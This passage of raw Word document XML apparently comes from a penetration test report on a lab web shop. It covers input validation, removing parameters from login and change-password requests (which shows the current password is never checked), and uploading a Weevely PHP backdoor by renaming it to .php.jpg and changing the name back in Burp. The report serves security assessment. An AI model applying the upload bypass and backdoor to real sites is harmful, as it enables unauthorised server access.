      </w:r>
      <w:r w:rsidR="000878BC">
        <w:t>form</w:t>
      </w:r>
      <w:r w:rsidR="00D06050">
        <w:t xml:space="preserve"> must contain some kind of input</w:t>
      </w:r>
      <w:r>
        <w:t>, however, only the email address field requires a specific input. The other fields require</w:t>
      </w:r>
      <w:r w:rsidR="00D06050">
        <w:t xml:space="preserve"> a minimum of</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> one character. </w:t>
      </w:r>
      <w:r w:rsidR="00D06050">
        <w:t xml:space="preserve">This input should not be accepted as most fields require more than one character, such as the address and postcode field. </w:t>
      </w:r>
      <w:r>
        <w:t>The</w:t>
      </w:r>
      <w:r w:rsidR="00D06050">
        <w:t xml:space="preserve"> format of the</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> email address field requires an @ symbol, with at least one character on either side. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="310A5694" w14:textId="458E09CF" w:rsidR="00D57FCB" w:rsidRDefault="00D57FCB" w:rsidP="00D0059A">
      <w:r>
        <w:t xml:space="preserve">If </w:t>
      </w:r>
      <w:r w:rsidR="00FD5DB4">
        <w:t>the user open</w:t>
      </w:r>
      <w:r w:rsidR="00C607C0">
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="00FD5DB4">
        <w:t xml:space="preserve"> two tabs, with one tab being on the processing page and the other being on the products page and adds an item to the cart, then the item cannot be seen on the processing page unless it is refreshed. If items are then removed from the cart, the process page still does not update unless refreshed.</w:t>
      </w:r>
      <w:r w:rsidR="00D06050">
        <w:t xml:space="preserve"> Meaning that the application would still continue with the original order until the page is updated.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67B4BCFF" w14:textId="43E0C2FD" w:rsidR="00FD5DB4" w:rsidRDefault="00FD5DB4" w:rsidP="00D0059A">
      <w:r>
        <w:t>The parameters required to add items</w:t>
      </w:r>
      <w:r w:rsidR="00DA5C6F">
        <w:t xml:space="preserve"> to the cart were captured using burp. These parameters were </w:t>
      </w:r>
      <w:r w:rsidR="00D06050">
        <w:t>copied</w:t>
      </w:r>
      <w:r w:rsidR="003C2952">
        <w:t>, and then the process page header was captured. The copied parameters were then pasted into the process page header</w:t>
      </w:r>
      <w:r w:rsidR="00DA5C6F">
        <w:t xml:space="preserve">, to </w:t>
      </w:r>
      <w:r w:rsidR="00D06050">
        <w:t>establish if</w:t>
      </w:r>
      <w:r w:rsidR="00DA5C6F">
        <w:t xml:space="preserve"> any impact on the site</w:t>
      </w:r>
      <w:r w:rsidR="00D06050">
        <w:t xml:space="preserve"> would occur</w:t>
      </w:r>
      <w:r w:rsidR="00DA5C6F">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00D06050">
        <w:t>However, n</w:t>
      </w:r>
      <w:r w:rsidR="00DA5C6F">
        <w:t xml:space="preserve">o changes were made on the site from the </w:t>
      </w:r>
      <w:r w:rsidR="003C2952">
        <w:t>edited</w:t>
      </w:r>
      <w:r w:rsidR="00DA5C6F">
        <w:t xml:space="preserve"> parameters being submitted.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B679760" w14:textId="5D51D021" w:rsidR="00DA5C6F" w:rsidRDefault="00DA5C6F" w:rsidP="00DA5C6F">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="43" w:name="_Toc531104362"/>
      <w:r>
        <w:t>Test Handling of Incomplete Input</w:t>
      </w:r>
      <w:bookmarkEnd w:id="43"/>
    </w:p>
    <w:p w14:paraId="26AA6CEA" w14:textId="7A09A42B" w:rsidR="00DA5C6F" w:rsidRDefault="0079536A" w:rsidP="00DA5C6F">
      <w:r>
        <w:t>The login page requires the user to input characters into both the username and password field, as they cannot be left empty. To test the logic behind the login function, each parameter will be individually removed from the</w:t>
      </w:r>
      <w:r w:rsidR="003C2952">
        <w:t xml:space="preserve"> header</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> request. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15827542" w14:textId="1B452C15" w:rsidR="0079536A" w:rsidRDefault="0079536A" w:rsidP="00DA5C6F">
      <w:r>
        <w:t xml:space="preserve">Upon removing </w:t>
      </w:r>
      <w:r w:rsidR="003C2952">
        <w:t>the</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> parameters, it was found that both are necessary to complete the request. By removing one parameter, the system would act like the corresponding field had been left empty. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D8B1F19" w14:textId="571C6B26" w:rsidR="002979BD" w:rsidRDefault="002979BD" w:rsidP="00DA5C6F">
      <w:r>
        <w:t xml:space="preserve">The parameters being removed can be seen in Figure </w:t>
      </w:r>
      <w:r w:rsidR="00D765D5">
        <w:t>36</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="695911CC" w14:textId="77777777" w:rsidR="002979BD" w:rsidRDefault="002979BD" w:rsidP="002979BD">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4053F792" wp14:editId="704D81A4">
            <wp:extent cx="3381375" cy="2762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81375" cy="276225"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="47B8E13E" w14:textId="6369F6F9" w:rsidR="002979BD" w:rsidRDefault="002979BD" w:rsidP="002979BD">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36</w:t>
      </w:r>
      <w:r w:rsidR="00AE0968">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - login page parameters</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76067E4E" w14:textId="0FF3C2B6" w:rsidR="00940E77" w:rsidRDefault="00940E77" w:rsidP="00DA5C6F">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">The change password function asks the user to enter their old password, and then enter their new password twice. The same process as above will be repeated, to test if all the parameters that are asked for are necessary. </w:t>
      </w:r>
      <w:r w:rsidR="00DE0768">
        <w:t>The password that will be changed is “hacklab”, and it will be changed to “Hackers”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35A4F78B" w14:textId="5A7CCEDC" w:rsidR="00DE0768" w:rsidRDefault="00DE0768" w:rsidP="00DA5C6F">
      <w:r>
        <w:t>The parameters that are passed through in the</w:t>
      </w:r>
      <w:r w:rsidR="002979BD">
        <w:t xml:space="preserve"> header can be seen in Figure </w:t>
      </w:r>
      <w:r w:rsidR="00D765D5">
        <w:t>37</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="784CDCC6" w14:textId="77777777" w:rsidR="00DE0768" w:rsidRDefault="00DE0768" w:rsidP="00DE0768">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7B10FD1B" wp14:editId="6D1D0A21">
            <wp:extent cx="6562096" cy="276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566684" cy="276418"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BAD9850" w14:textId="7E866B7F" w:rsidR="00DE0768" w:rsidRPr="00DA5C6F" w:rsidRDefault="00DE0768" w:rsidP="00DE0768">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37</w:t>
      </w:r>
      <w:r w:rsidR="00AE0968">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – change password function </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19B032DF" w14:textId="08080726" w:rsidR="00DE0768" w:rsidRDefault="00DE0768" w:rsidP="00D0059A">
      <w:r>
        <w:t>Each password parameter will be removed sequentially, to see if there is any impact on the outcome</w:t>
      </w:r>
      <w:r w:rsidR="002979BD">
        <w:t xml:space="preserve"> of the function. After this process, the user will then </w:t>
      </w:r>
      <w:r>
        <w:t>log out and log back in to see what password is used.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="283FD354" w14:textId="1A3DDA55" w:rsidR="00DE0768" w:rsidRDefault="00DE0768" w:rsidP="00D0059A">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve">Removal of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>currentpassword</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="51EDA760" w14:textId="2389CE32" w:rsidR="00DE0768" w:rsidRDefault="00DE0768" w:rsidP="00D0059A">
      <w:r>
        <w:t xml:space="preserve">After removing the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>currentpassword</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> parameter from the request, it was found that this field is not used by the system. The password</w:t>
      </w:r>
      <w:r w:rsidR="000878BC">
        <w:t xml:space="preserve"> was</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> still successfully updated to “Hackers”</w:t>
      </w:r>
      <w:r w:rsidR="00AE39FB">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C4DF71E" w14:textId="11F6CCBC" w:rsidR="00AE39FB" w:rsidRDefault="00AE39FB" w:rsidP="00D0059A">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve">Removal of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>newpassword</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="4419018B" w14:textId="187E19FB" w:rsidR="00AE39FB" w:rsidRDefault="00AE39FB" w:rsidP="00D0059A">
      <w:r>
        <w:t>The password does not successfully update after re</w:t>
      </w:r>
      <w:r w:rsidR="002979BD">
        <w:t xml:space="preserve">moving this parameter. Figure </w:t>
      </w:r>
      <w:r w:rsidR="00D765D5">
        <w:t>38</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> shows the error message that is displayed. An attempt to logout and then </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>log</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> back in under the original password was </w:t>
      </w:r>
      <w:r w:rsidR="0082495A">
        <w:t>made, to discover if the password did change did fail</w:t>
      </w:r>
      <w:r>
        <w:t>. The</w:t>
      </w:r>
      <w:r w:rsidR="002979BD">
        <w:t xml:space="preserve"> application rejected the new password and accepted the</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> old password, proving that the application did not update the password.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D3793E1" w14:textId="77777777" w:rsidR="00AE39FB" w:rsidRDefault="00AE39FB" w:rsidP="00AE39FB">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4076F5FF" wp14:editId="0E1A759D">
            <wp:extent cx="2819400" cy="1695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19400" cy="1695450"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F0862DE" w14:textId="6B7430C0" w:rsidR="00AE39FB" w:rsidRDefault="00AE39FB" w:rsidP="00AE39FB">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38</w:t>
      </w:r>
      <w:r w:rsidR="00AE0968">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - password function error message</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C108C04" w14:textId="03310B38" w:rsidR="00AE39FB" w:rsidRDefault="00AE39FB" w:rsidP="00AE39FB">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve">Removal of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>confirmpassword</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="0B881433" w14:textId="3C3201D2" w:rsidR="00AE39FB" w:rsidRDefault="00AE39FB" w:rsidP="00AE39FB">
      <w:r>
        <w:t xml:space="preserve">When this parameter was removed, the results were the exact same as removing the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>newpassword</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> parameter.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="657C99D9" w14:textId="4AA4932D" w:rsidR="00AE39FB" w:rsidRDefault="00AD6B4F" w:rsidP="00AE39FB">
      <w:r>
        <w:t>In summary, the change password function only requires the new passwords to be entered and</w:t>
      </w:r>
      <w:r w:rsidR="002979BD">
        <w:t xml:space="preserve"> for them to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> match. The </w:t>
      </w:r>
      <w:r w:rsidR="002979BD">
        <w:t>current</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> password is not required </w:t>
      </w:r>
      <w:r w:rsidR="002979BD">
        <w:t>throughout</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> the process. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66D6655F" w14:textId="404FB1B6" w:rsidR="00AD6B4F" w:rsidRDefault="00AD6B4F" w:rsidP="00AE39FB"/>
    <w:p w14:paraId="4C6157E7" w14:textId="10519171" w:rsidR="00AD6B4F" w:rsidRPr="00AE39FB" w:rsidRDefault="00AD6B4F" w:rsidP="00AD6B4F">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="44" w:name="_Toc531104363"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Test for Shared Hosting Vulnerabilities</w:t>
      </w:r>
      <w:bookmarkEnd w:id="44"/>
    </w:p>
    <w:p w14:paraId="1F917DCA" w14:textId="40EDC7B2" w:rsidR="005E0D68" w:rsidRDefault="005E0D68" w:rsidP="00AE39FB">
      <w:r>
        <w:t xml:space="preserve">As identified by </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Sqlmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> earlier, it appears that more than one website uses the webserver.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3916B1F5" w14:textId="39838603" w:rsidR="005E0D68" w:rsidRDefault="005E0D68" w:rsidP="005E0D68">
      <w:r>
        <w:t xml:space="preserve">Due to there being a file upload function for the profile picture, when logged in as a user, the tool </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Weevely</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00B1280A">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>(2018)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> could be used to try and upload a PHP file to the server. If this file upload is successful, then direct access to the webserver could be possible</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4754A000" w14:textId="2F157044" w:rsidR="005E0D68" w:rsidRDefault="005E0D68" w:rsidP="005E0D68">
      <w:r>
        <w:t xml:space="preserve">A </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Weevely</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> backdoor payload was generated and saved as a file called </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>weevely.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">. This file was then uploaded, however an error message appeared as seen in Figure </w:t>
      </w:r>
      <w:r w:rsidR="00D765D5">
        <w:t>39</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2336D871" w14:textId="77777777" w:rsidR="005E0D68" w:rsidRDefault="005E0D68" w:rsidP="005E0D68">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="58C76C69" wp14:editId="7596D521">
            <wp:extent cx="3714750" cy="17240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14750" cy="1724025"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3529218D" w14:textId="60D27D17" w:rsidR="005E0D68" w:rsidRDefault="005E0D68" w:rsidP="005E0D68">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
        <w:r w:rsidR="00D61A4D">
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:t>39</w:t>
        </w:r>
      </w:fldSimple>
      <w:r>
        <w:t xml:space="preserve"> - </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00366B56">
        <w:t>weevely.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00366B56">
        <w:t xml:space="preserve"> upload</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05F8ECFA" w14:textId="77777777" w:rsidR="005E0D68" w:rsidRDefault="005E0D68" w:rsidP="005E0D68">
      <w:r>
        <w:t xml:space="preserve">Because the file upload function only allows images, the file was edited to be called weevely.php.jpg, and then intercepted using burp. Once intercepted the filename was modified back to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>weevely.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39A7E2A0" w14:textId="569DE55D" w:rsidR="005E0D68" w:rsidRDefault="005E0D68" w:rsidP="005E0D68">
      <w:r>
        <w:t xml:space="preserve">This successfully bypassed the filter and the new message displayed can be seen in Figure </w:t>
      </w:r>
      <w:r w:rsidR="00D765D5">
        <w:t>40</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78ADE99D" w14:textId="77777777" w:rsidR="005E0D68" w:rsidRDefault="005E0D68" w:rsidP="005E0D68">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="367B3CCA" wp14:editId="30D7D724">
            <wp:extent cx="3486150" cy="18573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86150" cy="1857375"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="42E835E7" w14:textId="4BAC4FF4" w:rsidR="005E0D68" w:rsidRDefault="005E0D68" w:rsidP="005E0D68">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00D61A4D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>40</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - weevely.php.jpg upload</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6168C126" w14:textId="2BAAE048" w:rsidR="005E0D68" w:rsidRDefault="005E0D68" w:rsidP="005E0D68">
      <w:r>
        <w:t>The following headers submitted by the application were viewed, and it was seen that a GET request was made for a page called /pictures/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>weevely.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">. This information will be useful for calling the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Weevely</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AC6ADAB" w14:textId="3040FC5E" w:rsidR="005E0D68" w:rsidRDefault="005E0D68" w:rsidP="005E0D68">
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Weevely</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> file was then connected to via the terminal, completing the creation of the backdoor. A hacker would now be able to view all the files on the application, create directories and run scripts from within. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AB9A624" w14:textId="03B8DD32" w:rsidR="00B2468C" w:rsidRDefault="005E0D68" w:rsidP="005E0D68">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00D765D5">
        <w:t>41</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> shows the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Weevely</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> file being </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00B2468C">
        <w:t>created, and</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00B2468C">
        <w:t xml:space="preserve"> connected</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76CECF2E" w14:textId="77777777" w:rsidR="00B2468C" w:rsidRDefault="00B2468C" w:rsidP="00B2468C">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="26977886" wp14:editId="6A0A5D49">
            <wp:extent cx="5943600" cy="19786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978660"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F1ECBB4" w14:textId="6F6EA56F" w:rsidR="005E0D68" w:rsidRDefault="00B2468C" w:rsidP="00B2468C">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
        <w:r w:rsidR="00D61A4D">
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:t>41</w:t>
        </w:r>
      </w:fldSimple>
      <w:r>
        <w:t xml:space="preserve"> - </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Weevely</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> execution</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03012AF4" w14:textId="4B85EED5" w:rsidR="005E0D68" w:rsidRDefault="00B2468C" w:rsidP="005E0D68">
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00D765D5">
        <w:t>42</w:t>
      </w:r>
      <w:r w:rsidR="005E0D68">
        <w:t xml:space="preserve"> shows all of the options available to use from the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="005E0D68">
        <w:t>Weevely</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="005E0D68">
        <w:t xml:space="preserve"> backdoor</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ED97E19" w14:textId="4D97BF95" w:rsidR="005E0D68" w:rsidRDefault="005E0D68" w:rsidP="005E0D68">
      <w:r w:rsidRPr="008A4E2D">
        <w:rPr>
          <w:rStyle w:val="Heading1Char"/>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251676672" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="63655E09" wp14:editId="7496CF29">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>0</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>5607685</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="5943600"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4941318" w14:textId="5B6553E3" w:rsidR="00EA689B" w:rsidRPr="000C70DA" w:rsidRDefault="00EA689B" w:rsidP="005E0D68">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42</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:noProof/>
                              </w:rPr>
                              <w:fldChar w:fldCharType="end"/>
                            </w:r>
                            <w:r>
                              <w:t xml:space="preserve"> - </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:t>Weevely</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:t xml:space="preserve">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55E09" id="Text Box 84" o:spid="_x0000_s1029" type="#_x0000_t202" style="position:absolute;margin-left:0;margin-top:441.55pt;width:468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" stroked="f">
                <v:textbox style="mso-fit-shape-to-text:t" inset="0,0,0,0">
                  <w:txbxContent>
                    <w:p w14:paraId="54941318" w14:textId="5B6553E3" w:rsidR="00EA689B" w:rsidRPr="000C70DA" w:rsidRDefault="00EA689B" w:rsidP="005E0D68">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42</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:noProof/>
                        </w:rPr>
                        <w:fldChar w:fldCharType="end"/>
                      </w:r>
                      <w:r>
                        <w:t xml:space="preserve"> - </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:t>Weevely</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:t xml:space="preserve"> options</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="tight"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00B2468C" w:rsidRPr="008A4E2D">
        <w:rPr>
          <w:rStyle w:val="Heading1Char"/>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wpg">
